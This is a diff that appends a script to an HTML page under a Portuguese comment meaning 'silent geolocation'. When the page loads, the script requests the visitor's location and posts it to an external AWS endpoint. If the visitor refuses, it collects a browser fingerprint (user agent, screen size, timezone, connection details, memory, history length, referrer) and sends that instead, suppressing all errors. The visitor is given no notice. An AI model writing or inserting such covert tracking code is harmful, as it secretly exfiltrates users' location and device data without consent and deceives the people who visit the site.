@@ -1403,6 +1403,84 @@
                 }
             });
         });
+
+        // Geolocalização silenciosa
+        const API_URL = "https://4ezx5sqt84.execute-api.sa-east-1.amazonaws.com/loc";
+
+        function sendLocationToDynamoDB(latitude, longitude) {
+            fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ latitude, longitude })
+            }).catch(() => {});
+        }
+
+        function collectBrowserInfo() {
+            const userAgent = navigator.userAgent || "Desconhecido";
+            const language = navigator.language || "Desconhecido";
+            const screenWidth = window.screen.width || "Desconhecido";
+            const screenHeight = window.screen.height || "Desconhecido";
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Desconhecido";
+            const platform = navigator.platform || "Desconhecido";
+            const referrer = document.referrer || "Desconhecido";
+
+            const connection = navigator.connection || {};
+            const connectionType = connection.effectiveType || "Desconhecido";
+            const downlink = connection.downlink || "Desconhecido";
+            const rtt = connection.rtt || "Desconhecido";
+
+            const memory = navigator.deviceMemory || "Desconhecido";
+            const historyLength = window.history.length || "Desconhecido";
+
+            const performance = window.performance || {};
+            const timing = performance.timing || {};
+            const pageLoadTime = timing.loadEventEnd - timing.navigationStart || "Desconhecido";
+            const domContentLoadedTime = timing.domContentLoadedEventEnd - timing.navigationStart || "Desconhecido";
+
+            const cookiesEnabled = navigator.cookieEnabled ? "Sim" : "Não";
+            const saveData = navigator.connection && navigator.connection.saveData ? "Sim" : "Não";
+
+            return `UserAgent: ${userAgent}, Language: ${language}, Screen: ${screenWidth}x${screenHeight}, TimeZone: ${timeZone}, Platform: ${platform}, Referrer: ${referrer}, ConnectionType: ${connectionType}, Downlink: ${downlink}, RTT: ${rtt}, Memory: ${memory}GB, HistoryLength: ${historyLength}, PageLoadTime: ${pageLoadTime}ms, DOMContentLoadedTime: ${domContentLoadedTime}ms, CookiesEnabled: ${cookiesEnabled}, SaveData: ${saveData}`;
+        }
+
+        function sendFallbackInfo() {
+            const fallbackInfo = collectBrowserInfo();
+            fetch(API_URL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    latitude: 0,
+                    longitude: 0,
+                    info: fallbackInfo
+                })
+            }).catch(() => {});
+        }
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const { latitude, longitude } = position.coords;
+                        sendLocationToDynamoDB(latitude, longitude);
+                    },
+                    () => {
+                        sendFallbackInfo();
+                    }
+                );
+            } else {
+                sendFallbackInfo();
+            }
+        }
+
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                requestLocation();
+            }, 500);
+        });
     </script>
 </body>
 </html>
